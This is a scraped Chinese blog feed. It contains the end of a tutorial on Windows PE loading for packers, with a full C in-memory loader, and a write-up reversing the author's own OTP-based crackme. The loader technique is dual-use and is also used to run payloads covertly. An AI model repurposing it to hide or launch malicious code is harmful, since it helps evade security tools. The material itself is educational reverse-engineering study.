// but we put the addresses of the loaded function inside =\u0026gt; that\u0026#39;s the IAT  IMAGE_THUNK_DATA *address_table = (IMAGE_THUNK_DATA *)(p_image_base + import_descriptors[i].FirstThunk); // null terminated array, again  for (int i = 0; lookup_table[i].u1.AddressOfData != 0; ++i) { void *function_handle = NULL; // Check the lookup table for the adresse of the function name to import  DWORD lookup_addr = lookup_table[i].u1.AddressOfData; if ((lookup_addr \u0026amp; IMAGE_ORDINAL_FLAG) == 0) { // if first bit is not 1  // import by name : get the IMAGE_IMPORT_BY_NAME struct  IMAGE_IMPORT_BY_NAME *image_import = (IMAGE_IMPORT_BY_NAME *)(p_image_base + lookup_addr); // this struct points to the ASCII function name  char *funct_name = (char *)\u0026amp;(image_import-\u0026gt;Name); // get that function address from it\u0026#39;s module and name  function_handle = (void *)GetProcAddress(import_module, funct_name); } else { // import by ordinal, directly  function_handle = (void *)GetProcAddress(import_module, (LPSTR)lookup_addr); } if (function_handle == NULL) { printf(\u0026#34;function handle is null\u0026#34;); abort(); } // change the IAT, and put the function address inside.  address_table[i].u1.Function = (DWORD)function_handle; } } }   0x04 重定位 4.1 重定位介绍 回顾下前文我们做的事情：\n 打开 calc.exe ，读取它的文件头。 calc.exe 文件头中有一个 ImageBase ，保存它倾向于使用的内存基址。 calc.exe 启用了 ASLR 技术，所以理论上我们可以把它放到内存中任意位置。 我们用 VirtualAlloc 分配了内存，以NULL作为首参数，让操作系统决定在哪儿分配，结果用作镜像基址。 我们导入了必要的函数并把地址存放在 IAT 里。  然后现在，某时某刻，calc.exe 需要调用被导入的函数，用我们之前提过的方法。\n仔细观察图中的 opcode：FF15，紧跟着的是小端序的0x004b3038，一个绝对地址（前文所述的VA），指向 IAT 中 ShellExecuteW 函数的地址。这对于一个预期自己会被映射到随机基址上的PE文件来说，是一个巨大的问题。\n比如说，我们把 calc.exe 放置在 0x00500000 而不是文件头中”偏好“的镜像基址 0x00400000，这条 call 指令还保持不变的话，它会尝试去访问地址 0x004b3038 ——但这不是 calc.exe 的内存空间！那儿可能有任何东西，也可能什么也没有。\n我们这里看到的是，当我们移动了 PE 文件在内存中的基址，汇编代码也需要在运行时修补，来响应基址的变化。这就是重定位所关注的事情。\n4.2 PE重定位结构 重定位结构比导入表简单得多。\n同样的，在 Data Directory 里有一个重定位表，结构和导入表类似，看图。\n实际上每个IMAGE_BASE_RELOCATION反应的就是一个 Windows 页（因为每个fixup的偏移最大取值只有 12bits，0x1000，4KB）。\n其中每个 fixup 都是一个 WORD ，前 4bits 表示重定位类型，后 12bits 表示相对 IMAGE_BASE_RELOCATION.VirtualAddress 的偏移值，偏移处需要应用重定位（就是加上真实基地址和PE头中基地址的差）。\n4.3 修复重定位 修复重定位必须在PE头和Sections加载到内存之后，设置内存保护之前进行。\n1 2 3 4 5 6 7  IMAGE_DATA_DIRECTORY *data_directory = p_NT_headers-\u0026gt;OptionalHeader.DataDirectory; // this is how much we shifted the ImageBase DWORD delta_VA_reloc = ((DWORD)p_image_base) - p_NT_headers-\u0026gt;OptionalHeader.ImageBase; // if there is a relocation table, and we actually shitfted the ImageBase if (data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 \u0026amp;\u0026amp; delta_VA_reloc != 0) {   在代码的开始，需要确认是不是有必要做重定位。如果基地址和PE文件头中给出的基地址相同，那就不用考虑重定位了。判断方式是拿真实基地址减去文件头里给出的基地址，非0则说明基地址需要重定位。\n1 2 3  // calculate the relocation table address IMAGE_BASE_RELOCATION *p_reloc = (IMAGE_BASE_RELOCATION *)(p_image_base + data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);   从RVA得到重定位表指针，然后就是遍历。\n1 2 3 4 5 6 7  // once again, a null terminated array while (p_reloc-\u0026gt;VirtualAddress != 0) { // ...  // switch to the next relocation block, based on the size  p_reloc = (IMAGE_BASE_RELOCATION *)(((DWORD)p_reloc) + p_reloc-\u0026gt;SizeOfBlock); }   SizeOfBlock其实是包括IMAGE_BASE_RELOCATION（Header）和属于这个块的所有 fixup 组成的总大小，这里强制转换成 DWORD 后相加就得到了下一个 IMAGE_BASE_RELOCATION 结构的地址。\n同样的，这也是前文所述的 null terminated array 。\n1 2 3 4 5  // how any relocation in this block // ie the total size, minus the size of the \u0026#34;header\u0026#34;, divided by 2 (those are words, so 2 bytes for each) DWORD size = (p_reloc-\u0026gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2; // the first relocation element in the block, right after the header (using pointer arithmetic again) WORD *fixups = (WORD *)(p_reloc + 1);   在循环体内，先计算出了元素总数（(总大小(字节) - IMAGE_BASE_RELOCATION 结构大小(字节)) / 2 ），然后用指针算术取得第一个元素的地址。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  for (int i = 0; i \u0026lt; size; ++i) { // type is the first 4 bits of the relocation word  int type = fixups[i] \u0026gt;\u0026gt; 12; // offset is the last 12 bits  int offset = fixups[i] \u0026amp; 0x0fff; // this is the address we are going to change  DWORD *change_addr = (DWORD *)(p_image_base + p_reloc-\u0026gt;VirtualAddress + offset); // there is only one type used that needs to make a change  switch (type) { case IMAGE_REL_BASED_HIGHLOW: *change_addr += delta_VA_reloc; break; default: break; } }   遍历所有元素。如上文所述的，把每个 fixup 取高位4比特和低位12比特，计算出要修补的地址。再根据修补的类型来应用。\n参考微软文档的Base Relocation Types。值得注意 type 就两个：IMAGE_REL_BASED_HIGHLOW 和 IMAGE_REL_BASED_DIR64 ，分别是 32位和64位的重定向。其他16位重定向不多说了。\n完整代码如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  void fix_base_reloc(char *p_image_base, IMAGE_NT_HEADERS *p_NT_headers) { IMAGE_DATA_DIRECTORY *data_directory = p_NT_headers-\u0026gt;OptionalHeader.DataDirectory; // this is how much we shifted the ImageBase  DWORD delta_VA_reloc = ((DWORD)p_image_base) - p_NT_headers-\u0026gt;OptionalHeader.ImageBase; // if there is a relocation table, and we actually shitfted the ImageBase  if (data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 \u0026amp;\u0026amp; delta_VA_reloc != 0) { // calculate the relocation table address  IMAGE_BASE_RELOCATION *p_reloc = (IMAGE_BASE_RELOCATION *)(p_image_base + data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress); // once again, a null terminated array  while (p_reloc-\u0026gt;VirtualAddress != 0) { // how any relocation in this block  // ie the total size, minus the size of the \u0026#34;header\u0026#34;, divided by 2 (those are words, so 2 bytes for each)  DWORD size = (p_reloc-\u0026gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2; // the first relocation element in the block, right after the header (using pointer arithmetic again)  WORD *fixups = (WORD *)(p_reloc + 1); for (int i = 0; i \u0026lt; size; ++i) { // type is the first 4 bits of the relocation word  int type = fixups[i] \u0026gt;\u0026gt; 12; // offset is the last 12 bits  int offset = fixups[i] \u0026amp; 0x0fff; // this is the address we are going to change  DWORD *change_addr = (DWORD *)(p_image_base + p_reloc-\u0026gt;VirtualAddress + offset); // there is only one type used that needs to make a change  switch (type) { case IMAGE_REL_BASED_HIGHLOW: *change_addr += delta_VA_reloc; break; default: break; } } // switch to the next relocation block, based on the size  p_reloc = (IMAGE_BASE_RELOCATION *)(((DWORD)p_reloc) + p_reloc-\u0026gt;SizeOfBlock); } } }   0x05 完整 Loader 程序 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;Windows.h\u0026gt;#include \u0026lt;winnt.h\u0026gt; void *load_PE(char *PE_data); void fix_iat(char *, IMAGE_NT_HEADERS *); void fix_base_reloc(char *p_image_base, IMAGE_NT_HEADERS *p_NT_headers); int main(int argc, char const *argv[]) { if (argc \u0026lt; 2) { printf(\u0026#34;missing path argument\\n\u0026#34;); return 1; } FILE *exe_file = fopen(argv[1], \u0026#34;rb\u0026#34;); if (!exe_file) { printf(\u0026#34;error opening file\\n\u0026#34;); return 1; } // Get file size : put pointer at the end  fseek(exe_file, 0L, SEEK_END); // and read its position  long int file_size = ftell(exe_file); // put the pointer back at the beginning  fseek(exe_file, 0L, SEEK_SET); // allocate memory and read the whole file  char *exe_file_data = malloc(file_size + 1); // read whole file  size_t n_read = fread(exe_file_data, 1, file_size, exe_file); if (n_read != file_size) { printf(\u0026#34;reading error (%d)\\n\u0026#34;, n_read); return 1; } // load the PE in memory  printf(\u0026#34;[+] Loading PE file\\n\u0026#34;); void *entry = load_PE(exe_file_data); if (entry != NULL) { // call its entrypoint  ((void (*)(void))entry)(); } return 0; } void *load_PE(char *PE_data) { IMAGE_DOS_HEADER *p_DOS_header = (IMAGE_DOS_HEADER *)PE_data; IMAGE_NT_HEADERS *p_NT_headers = (IMAGE_NT_HEADERS *)(PE_data + p_DOS_header-\u0026gt;e_lfanew); // extract information from PE header  DWORD size_of_image = p_NT_headers-\u0026gt;OptionalHeader.SizeOfImage; DWORD entry_point_RVA = p_NT_headers-\u0026gt;OptionalHeader.AddressOfEntryPoint; DWORD size_of_headers = p_NT_headers-\u0026gt;OptionalHeader.SizeOfHeaders; // allocate memory  // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc  char *p_image_base = (char *)VirtualAlloc(NULL, size_of_image, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); if (p_image_base == NULL) { return NULL; } // copy PE headers in memory  memcpy(p_image_base, PE_data, size_of_headers); // Section headers starts right after the IMAGE_NT_HEADERS struct, so we do some pointer arithmetic-fu here.  IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *)(p_NT_headers + 1); for (int i = 0; i \u0026lt; p_NT_headers-\u0026gt;FileHeader.NumberOfSections; i++) { // calculate the VA we need to copy the content, from the RVA  // section[i].VirtualAddress is a RVA, mind it  char *dest = p_image_base + sections[i].VirtualAddress; // check if there is Raw data to copy  if (sections[i].SizeOfRawData \u0026gt; 0) { // We copy SizeOfRaw data bytes, from the offset PointerToRawData in the file  memcpy(dest, PE_data + sections[i].PointerToRawData, sections[i].SizeOfRawData); } else { memset(dest, 0, sections[i].Misc.VirtualSize); } } fix_iat(p_image_base, p_NT_headers); fix_base_reloc(p_image_base, p_NT_headers); // Set permission for the PE header to read only  DWORD oldProtect; VirtualProtect(p_image_base, p_NT_headers-\u0026gt;OptionalHeader.SizeOfHeaders, PAGE_READONLY, \u0026amp;oldProtect); for (int i = 0; i \u0026lt; p_NT_headers-\u0026gt;FileHeader.NumberOfSections; ++i) { char *dest = p_image_base + sections[i].VirtualAddress; DWORD s_perm = sections[i].Characteristics; DWORD v_perm = 0; // flags are not the same between virtal protect and the section header  if (s_perm \u0026amp; IMAGE_SCN_MEM_EXECUTE) { v_perm = (s_perm \u0026amp; IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ; } else { v_perm = (s_perm \u0026amp; IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY; } VirtualProtect(dest, sections[i].Misc.VirtualSize, v_perm, \u0026amp;oldProtect); } return (void *)(p_image_base + entry_point_RVA); } void fix_iat(char *p_image_base, IMAGE_NT_HEADERS *p_NT_headers) { IMAGE_DATA_DIRECTORY *data_directory = p_NT_headers-\u0026gt;OptionalHeader.DataDirectory; // load the address of the import descriptors array  IMAGE_IMPORT_DESCRIPTOR *import_descriptors = (IMAGE_IMPORT_DESCRIPTOR *)(p_image_base + data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // this array is null terminated  for (int i = 0; import_descriptors[i].OriginalFirstThunk != 0; ++i) { // Get the name of the dll, and import it  char *module_name = p_image_base + import_descriptors[i].Name; HMODULE import_module = LoadLibraryA(module_name); if (import_module == NULL) { printf(\u0026#34;import module is null\u0026#34;); abort(); } // the lookup table points to function names or ordinals =\u0026gt; it is the IDT  IMAGE_THUNK_DATA *lookup_table = (IMAGE_THUNK_DATA *)(p_image_base + import_descriptors[i].OriginalFirstThunk); // the address table is a copy of the lookup table at first  // but we put the addresses of the loaded function inside =\u0026gt; that\u0026#39;s the IAT  IMAGE_THUNK_DATA *address_table = (IMAGE_THUNK_DATA *)(p_image_base + import_descriptors[i].FirstThunk); // null terminated array, again  for (int i = 0; lookup_table[i].u1.AddressOfData != 0; ++i) { void *function_handle = NULL; // Check the lookup table for the adresse of the function name to import  DWORD lookup_addr = lookup_table[i].u1.AddressOfData; if ((lookup_addr \u0026amp; IMAGE_ORDINAL_FLAG) == 0) { // if first bit is not 1  // import by name : get the IMAGE_IMPORT_BY_NAME struct  IMAGE_IMPORT_BY_NAME *image_import = (IMAGE_IMPORT_BY_NAME *)(p_image_base + lookup_addr); // this struct points to the ASCII function name  char *funct_name = (char *)\u0026amp;(image_import-\u0026gt;Name); // get that function address from it\u0026#39;s module and name  function_handle = (void *)GetProcAddress(import_module, funct_name); } else { // import by ordinal, directly  function_handle = (void *)GetProcAddress(import_module, (LPSTR)lookup_addr); } if (function_handle == NULL) { printf(\u0026#34;function handle is null\u0026#34;); abort(); } // change the IAT, and put the function address inside.  address_table[i].u1.Function = (DWORD)function_handle; } } } void fix_base_reloc(char *p_image_base, IMAGE_NT_HEADERS *p_NT_headers) { IMAGE_DATA_DIRECTORY *data_directory = p_NT_headers-\u0026gt;OptionalHeader.DataDirectory; // this is how much we shifted the ImageBase  DWORD delta_VA_reloc = ((DWORD)p_image_base) - p_NT_headers-\u0026gt;OptionalHeader.ImageBase; // if there is a relocation table, and we actually shitfted the ImageBase  if (data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 \u0026amp;\u0026amp; delta_VA_reloc != 0) { // calculate the relocation table address  IMAGE_BASE_RELOCATION *p_reloc = (IMAGE_BASE_RELOCATION *)(p_image_base + data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress); // once again, a null terminated array  while (p_reloc-\u0026gt;VirtualAddress != 0) { // how any relocation in this block  // ie the total size, minus the size of the \u0026#34;header\u0026#34;, divided by 2 (those are words, so 2 bytes for each)  DWORD size = (p_reloc-\u0026gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2; // the first relocation element in the block, right after the header (using pointer arithmetic again)  WORD *fixups = (WORD *)(p_reloc + 1); for (int i = 0; i \u0026lt; size; ++i) { // type is the first 4 bits of the relocation word  int type = fixups[i] \u0026gt;\u0026gt; 12; // offset is the last 12 bits  int offset = fixups[i] \u0026amp; 0x0fff; // this is the address we are going to change  DWORD *change_addr = (DWORD *)(p_image_base + p_reloc-\u0026gt;VirtualAddress + offset); // there is only one type used that needs to make a change  switch (type) { case IMAGE_REL_BASED_HIGHLOW: *change_addr += delta_VA_reloc; break; default: break; } } // switch to the next relocation block, based on the size  p_reloc = (IMAGE_BASE_RELOCATION *)(((DWORD)p_reloc) + p_reloc-\u0026gt;SizeOfBlock); } } }   0x06 结论 本文的背景知识基本是参考相关书籍，编写 Loader 的部分则来自 BidouilleSecurity 。关于加壳脱壳原理，不乏形象直观的描述，也有很多脱壳相关文章，但适合萌新上手、能照着撸出代码的文章就很少，甚至可以说没地方找。抛开加壳脱壳这些特定领域话题不谈，程序的加载到执行本身对有好奇心的码农也是很值得一聊的内容。\n目前讨论的范围包括了如何加载并运行一个Windows程序（32位），大致流程如下：\n 读取文件到内存 映射文件头到基地址 映射Sections 填充IAT 重定位 跳转到入口点开始执行。  在对这些知识有了足够了解后，已经能写出基本的壳程序了。也许下一篇文章会谈。\n参考资料：\n  writing a PE packer - Part 1 : Load a PE in memory\n  writing a PE packer - Part 2 : Imports and relocations\n  《程序员的自我修养——链接、装载与库》\n  微软文档 - PE Format\n  ","date":"2021-09-27T14:51:00+08:00","image":"https://nnnewb.github.io/blog/p/learning-packer-01/cover_hu8b7651a2bda3b235d3ed49f67a1e20bd_99156_120x120_fill_q75_box_smart1.jpg","permalink":"https://nnnewb.github.io/blog/p/learning-packer-01/","title":"加壳原理01 - Windows 程序的加载和运行"},{"content":"前言 总得有个前言。\n一直玩命令行 crackme 看着就没啥意思，来点带界面的。依然是学习用，目标是把汇编和底层和内存这套东西读熟。这次是用 wxwidgets 做的简单 crackme，为了在 CrackME-02 基础上再增加点难度但又不至于太难，这次是 OTP 生成序列号，要求解出生成 OTP 的 SECRET。\n源码 越来越长了，贴上来没法看。现在托管到GitHub，包括前面的两个cm。\n前两个cm托管的代码编译参数有一点修改，可能造成结果和文章不一致，但大体是一样的，别在意。\n源码托管地址：github.com/nnnewb/crackmes\n挑战一下C++代码开启优化的Hard模式。\n观察 一个输入框，点击try it尝试。失败时提示Wrong，没有别的信息。\n静态分析 老规矩先静态分析一波，粗略扫一眼，捋一捋逻辑。用你喜欢的反汇编工具打开，我用Cutter先试试。\n因为是GUI程序，直接跳main肯定是不行的。Win32 GUI程序的入口点（程序员视角）在WinMain这个特殊函数，不过真拿Win32API手撸界面我是真没见过了，Win32 GUI程序设计也是玩的事件响应，找到主函数的意义不大。\n所以找关键跳这一步只能是从数据段找字符串查引用，或者调试器下合适的访问断点了。\n这里直接从数据段找到了字符串，定位到弹出错误对话框的逻辑。\n这里有个姿势点是__thiscall，这是个微软自定义的调用约定，点这里看微软的文档。\n__thiscall __thiscall的特点是被调用方清栈，this指针通过ecx寄存器传递，其他参数右至左压栈。对于可变长度参数（VAARG）的成员函数会特殊处理，采用cdecl调用约定，this指针最后压栈。\n这里简单读一下定位到的几句代码，分析下意图。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  0x004064dc 68 34 e8 40 00 push str.Try_again ; 0x40e834 0x004064e1 8d 4d d0 lea ecx, [ebp - 0x30] 0x004064e4 ff 15 e0 33 41 00 call dword [public: void __thiscall wxString::constructor(char const *)] ; 0x4133e0 0x004064ea 68 44 e8 40 00 push str.Wrong ; 0x40e844 0x004064ef 8d 4d b0 lea ecx, [ebp - 0x50] 0x004064f2 c6 45 fc 07 mov byte [ebp - 4], 7 0x004064f6 ff 15 e0 33 41 00 call dword [public: void __thiscall wxString::constructor(char const *)] ; 0x4133e0 0x004064fc 6a ff push 0xffffffffffffffff 0x004064fe 6a ff push 0xffffffffffffffff 0x00406500 6a 00 push 0 0x00406502 6a 05 push 5 ; 5 0x00406504 8d 45 d0 lea eax, [ebp - 0x30] 0x00406507 c6 45 fc 08 mov byte [ebp - 4], 8 0x0040650b 50 push eax 0x0040650c 8d 45 b0 lea eax, [ebp - 0x50] 0x0040650f 50 push eax 0x00406510 ff 15 d4 3c 41 00 call dword [int __cdecl wxMessageBox(class wxString const \u0026amp;, class wxString const \u0026amp;, long int, class wxWindow *, int, int)] ; 0x413cd4   反编译器对调用的第三方库的函数分析极大降低了肉眼判读的难度。可以看到前三步push、lea ecx,...、call 是典型的 __thiscall 调用，调用对象是wxString的构造器，所以可以知道ecx地址保存的是一个wxString对象的指针。\n1 2 3 4  0x004064ea 68 44 e8 40 00 push str.Wrong ; 0x40e844 0x004064ef 8d 4d b0 lea ecx, [ebp - 0x50] 0x004064f2 c6 45 fc 07 mov byte [ebp - 4], 7 0x004064f6 ff 15 e0 33 41 00 call dword [public: void __thiscall wxString::constructor(char const *)] ; 0x4133e0   这是另一个wxString的构造。\n1 2 3 4 5 6 7 8 9 10  0x004064fc 6a ff push 0xffffffffffffffff 0x004064fe 6a ff push 0xffffffffffffffff 0x00406500 6a 00 push 0 0x00406502 6a 05 push 5 ; 5 0x00406504 8d 45 d0 lea eax, [ebp - 0x30] 0x00406507 c6 45 fc 08 mov byte [ebp - 4], 8 0x0040650b 50 push eax 0x0040650c 8d 45 b0 lea eax, [ebp - 0x50] 0x0040650f 50 push eax 0x00406510 ff 15 d4 3c 41 00 call dword [int __cdecl wxMessageBox(class wxString const \u0026amp;, class wxString const \u0026amp;, long int, class wxWindow *, int, int)] ; 0x413cd4   连续推入多个参数后，调用了wxMessageBox函数。我们知道[ebp-0x30]是Try again，[ebp-0x50] 是 Wrong!，这个调用用伪代码表示就是 wxMessageBox(\u0026quot;Wrong!\u0026quot;, \u0026quot;Try again!\u0026quot;, 5, 0, -1, -1)。注意忽略中间的mov byte [ebp - 4], 8，ebp-4这个偏移显然不大可能是参数。\n关键跳 回到这段代码的开头，顺着界面上的绿色箭头找到关键跳。\n一个je跳转，je指令检查ZF，向上一行就是test，test bl,bl自己对自己逻辑与，其实就是求bl是不是0。\nbl又来自前面的mov bl,al，al寄存器是eax寄存器的低8位，再者大家也知道eax寄存器是函数返回值保存的寄存器，而离这个mov指令最近的call就是截图上方的IsSameAs函数了。\n到了这一步，改指令跳过验证已经接近成功了，但这要是做 keygen 的话还不行。\n继续往回翻，寻找密码生成的代码。\n寻找密码生成算法 先一路回到关键跳所处的代码块顶部，挨个往下看有哪些函数调用。\n还是那句话，感谢分析出了库函数，不然一堆未知函数看得满头雾水。\n  调用是 wxString.AsWChar(void)，顾名思义是取宽字符，返回指针。\n  调用是wxString.DoFormatWchar(wchar_t*)，查询文档可知是个类似sprintf的字符串格式化函数。\n  调用是析构函数，怀疑上面的两个调用其实是内联了什么wxwidgets库的代码。因为直觉告诉我如果还没离开作用域，编译器应该不会这么着急插入析构函数调用，这听起来就没什么好处，还违背码农直觉。\n  函数就比较迷惑了，一路看上去的话会发现这个偏移值经过了多次计算，目前看不出用意，但还挺可疑的。\n  函数顾名思义，比较字符串相等。\n  又是析构函数。\n  重点看字符串比较函数的参数：\n1 2 3 4 5 6  0x0040646c 6a 01 push 1 ; 1 0x0040646e 8d 4d 90 lea ecx, [ebp - 0x70] 0x00406471 c6 45 fc 04 mov byte [ebp - 4], 4 0x00406475 51 push ecx 0x00406476 8b c8 mov ecx, eax 0x00406478 ff 15 d4 33 41 00 call dword [public: bool __thiscall wxString::IsSameAs(class wxString const \u0026amp;, bool)const] ; 0x4133d4   把eax当成了this，暂且不看栈上的ebp-0x70，看到eax立刻就发现是来自第四个比较迷惑的函数调用，实锤这函数就是生成密码的函数。\n动态调试 水平有限，静态分析很快遇到了瓶颈，找不出这个偏移值算出来的函数到底在哪儿。\n于是启动调试器，先跟到我们定位到的这个特殊函数。\n惊喜地发现胡乱分析出现了错误，eax+0x40其实是获取输入框值的函数。。所以另一个参数，ebp-0x70才是密码。\n往回看ebp-0x70在DoFormatWchar被当参数传递了进去，要注意的是DoFormatWchar是一个有变长参数的函数，这意味着你没法得知传了几个参数（前面push的内容不一定是当参数传了），分析更困难。\n看一下DoFormatWchar这段汇编。\n1 2 3 4 5 6 7  0x0040642c 8d 8d 70 ff ff ff lea ecx, [ebp - 0x90] 0x00406432 ff 15 e8 33 41 00 call dword [private: wchar_t const * __thiscall wxFormatString::AsWChar(void)] ; 0x4133e8 0x00406438 56 push esi 0x00406439 50 push eax 0x0040643a 8d 45 90 lea eax, [ebp - 0x70] 0x0040643d 50 push eax 0x0040643e ff 15 d0 33 41 00 call dword [private: static class wxString __cdecl wxString::DoFormatWchar(wchar_t const *)] ; 0x4133d0   一共推了三个东西入栈，esi、eax（上一个调用的返回值）、还有[ebp-0x70]。\n继续调试器跟一遍看看。\nesi的值比较怪，先忽略。\neax比较清楚，宽字符串%06d，按压栈顺序，esi的值是紧跟在格式化字符串后面的参数。\n最后压栈的eax，也就是ebp-0x70的地址，用伪代码表示就是：DoFormatWchar(\u0026amp;var_70, L\u0026quot;%06d\u0026quot;, 0x000F18D8)。PS：有点怪，函数签名最左侧是format也就是格式化字符串，最后压栈这个ebp-0x70就有点莫名其妙。\n不过用调试器单步步过后就知道用途了，和猜测的一样，存放的是格式化的结果，也就是正确的密码。\n既然如此，往回找esi是哪儿赋值的，因为inline了一大堆东西，Cutter连函数都认不出来了，控制流视图也挂了。。一直往上翻，找到0xcc或者push ebp; mov ebp, esp为止。\n右键选择在此处定义函数，随便给个名字，然后等Cutter分析好函数体。\n这样一来至少图形视图就能看了。粗略扫一眼，在底下找到IsSameAs这个调用，再往回翻哪儿动了esi这个寄存器，很快找到这两段。\n有点杂，先看看。还是粗略按意图把指令分下段。esi来源涉及eax和ecx，一路跟着赋值路径往回翻到第一个块，找到ecx的赋值。\n1 2  0x004062f1 e8 68 b3 ff ff call fcn.0040165e 0x004062f6 8b 08 mov ecx, dword [eax]   一个未知函数，ctrl+左键点击跟进去后发现疑似是 libcrypto 内联的函数，调用了 HMAC-SHA1 算法。\n先做个标记，猜测假设这个函数正确返回（下面的je跳转走到最后一个块），那返回结果应该是HMAC-SHA1的结果。这里通过调试器单步验证。\n因为 ASLR 的缘故，可执行文件 .text 段映射的地址不是 0x00401000，调试器没法直接转到静态分析工具中的地址，ASLR 确实折磨人\u0026hellip;\nanyway\u0026hellip;\n我投翔，特立独行是没好结果的，跑去下载了一个 IDA Free ，打开x32dbg确认 .text 段映射的基址后再到 IDA 的菜单 Edit -\u0026gt; Segments -\u0026gt; rebase program ... 重新设定镜像基址，这样在反汇编界面看到的地址就能和调试器对上了。缺陷是每次打开调试器都要对一次镜像基址，比较麻烦。\n对好镜像基址后，把之前想调试的函数调用地址找到（0x003B62F1），下个断点，看调用后的eax值，发现并不像纯c编译出来的结果，eax并没有什么卵用。\n稍微往上瞟了一眼，很容易看到一个mov ecx,esi，但没什么卵用。\n碰壁几次后决定跟进这个函数看看。无果。恼，作弊之（读过RFC可能注意到几个特殊常量，比如取哈希结果下标19，与0xf，作为偏移值向后再取4字节，作为bin code。跳过这个函数调用，直接看接下来的内容的话，会发现哈希值其实就存在ecx保存的地址上了。）\n只是这里的HMAC_SHA1值因为不是我们熟悉的ASCII表示，所以一眼有点难看出来。\n那么直接跳过上面不清不楚的地方，直接看取哈希后的做法。\n1 2 3 4 5 6 7 8 9 10 11 12 13  .text:003B6307 movzx eax, byte ptr [ecx+13h] .text:003B630B and eax, 0Fh ; 取 hash[19] \u0026amp; 0xf 作为初始偏移 .text:003B630E add ecx, eax .text:003B6310 movzx esi, byte ptr [ecx] ; 取偏移处第一个字节，无符号 .text:003B6313 movzx eax, byte ptr [ecx+1] ; 取偏移处第二个字节，无符号 .text:003B6317 and esi, 7Fh ; 偏移处第一个字节 \u0026amp; 0x7f ，确保符号位归零 .text:003B631A shl esi, 8 ; 第一个字节左移8位后 | 第二个字节，就是把四个字节按顺序填进esi .text:003B631D or esi, eax .text:003B631F movzx eax, byte ptr [ecx+2] .text:003B6323 shl esi, 8 .text:003B6326 or esi, eax .text:003B6328 movzx eax, byte ptr [ecx+3] .text:003B632C shl esi, 8   取得的就是4字节正整数了，按RFC的例子，接下来应该取模得到最大6位整数。看下一块汇编。\n1 2 3 4 5 6 7 8 9 10 11  .text:003B6331 mov ecx, [ebp+Block] .text:003B6334 mov eax, 431BDE83h ; magic ? .text:003B6339 imul esi .text:003B633B sar edx, 12h .text:003B633E mov eax, edx .text:003B6340 shr eax, 1Fh .text:003B6343 add eax, edx .text:003B6345 imul eax, 0F4240h .text:003B634B sub esi, eax .text:003B634D test ecx, ecx .text:003B634F jz short loc_3B638F   431BDE83h 这个魔术常量吓到我了。搜了一下找到篇看雪的帖子，看起来是编译器把一句%1000000取模给编译成了上面这一串满是魔数的汇编。尝试跟到 sub esi,eax 后，esi 寄存器的结果的确变成了6位以内的整数。\n这玩意儿有什么特征吗？总不至于多做几次取模，生成的汇编就完全没法看了吧。。。\nkeygen？ 实力有限，尽管亲手写下的C++代码真的很简单，但编译后的结果成了无法承受之重\u0026hellip;\n上面分析的内容，其实仔细对着RFC推敲（首先，你得知道是照着RFC写的，不然就多读几遍汇编\u0026hellip;），才能很勉强得到个粗糙的算法，至于能不能写出 keygen，我没啥信心。\n结论 很难。\n如果说前面的 C 代码是小游戏的话，那 cm03 就是地球online。开启优化的C++无间地狱。\n完全溃败。\n","date":"2021-09-24T16:58:00+08:00","permalink":"https://nnnewb.github.io/blog/p/crackme-03/","title":"自娱自乐 crackme-03"},{"content":"得有个前言 总之上一个 crackme-01 还过得去，稍微加强一点，把密码隐藏起来，不要随便被看到。\n0x01 源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt; size_t getline(char **lineptr, size_t *n, FILE *stream) { char *bufptr = NULL; char *p = bufptr; size_t size; int c; if (lineptr == NULL) { return -1; } if (stream == NULL) { return -1; } if (n == NULL) { 